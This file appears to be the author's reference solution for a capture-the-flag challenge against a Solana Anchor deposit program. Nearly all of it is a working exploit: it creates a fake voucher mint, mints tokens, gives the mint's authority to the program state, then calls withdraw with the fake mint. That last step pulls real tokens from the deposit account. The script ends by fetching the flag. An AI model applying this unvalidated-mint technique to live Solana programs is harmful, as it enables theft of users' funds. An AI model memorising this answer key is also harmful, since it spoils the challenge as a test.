import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";

// XXX PLAYER IMPORTS should be deleted to avoid spoiling
import { PublicKey, Keypair, SystemProgram, Transaction } from "@solana/web3.js";
import {
    getAssociatedTokenAddress, createInitializeMintInstruction, createAssociatedTokenAccountInstruction,
    createMintToInstruction, createSetAuthorityInstruction,
    MINT_SIZE, ACCOUNT_SIZE, TOKEN_PROGRAM_ID,
} from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge1.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeOne;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
    // XXX NOTE i wrote this before i refactored the server to behave like a real solana connection
    // this is now needlessly complicated, the regular solana/spl helpers all work
    // theres no point in rewriting tho since the player doesnt receive this

    let DECIMALS = 6;
    let playerAccount = await getAssociatedTokenAddress(accounts.bitcoinMint, player.publicKey);

    // create a fake voucher mint
    let evilMint = Keypair.generate();
    let mintRent = await api.getMinimumRent(baseUrl, player.publicKey, MINT_SIZE);
    await sendInstructions(
        baseUrl,
        [
            SystemProgram.createAccount({
                fromPubkey: player.publicKey,
                newAccountPubkey: evilMint.publicKey,
                space: MINT_SIZE,
                lamports: mintRent,
                programId: TOKEN_PROGRAM_ID,
            }),
            createInitializeMintInstruction(evilMint.publicKey, DECIMALS, player.publicKey, null)
        ],
        [player, evilMint]
    );
    evilMint = evilMint.publicKey;

    // create us an account for it
    let evilAccount = await getAssociatedTokenAddress(evilMint, player.publicKey);
    await sendInstructions(
        baseUrl,
        [createAssociatedTokenAccountInstruction(player.publicKey, evilAccount, player.publicKey, evilMint)],
        [player]
    );

    // mint us a fake voucher
    await sendInstructions(
        baseUrl,
        [createMintToInstruction(evilMint, evilAccount, player.publicKey, 10 ** DECIMALS)],
        [player]
    );

    // gift our poison mint to the depository
    await sendInstructions(
        baseUrl,
        [createSetAuthorityInstruction(evilMint, player.publicKey, 0, accounts.state)],
        [player]
    );

    // and laugh all the way to the bank
    let ixn = program.instruction.withdraw(new BN(10 ** DECIMALS), {
        accounts: {
            player: player.publicKey,
            depositor: player.publicKey,
            state: accounts.state,
            depositAccount: accounts.depositAccount,
            voucherMint: evilMint,
            depositorAccount: playerAccount,
            depositorVoucherAccount: evilAccount,
            tokenProgram: TOKEN_PROGRAM_ID,
        }, signers: [player],
    });
    await sendInstructions(baseUrl, [ixn], [player]);
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 1);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
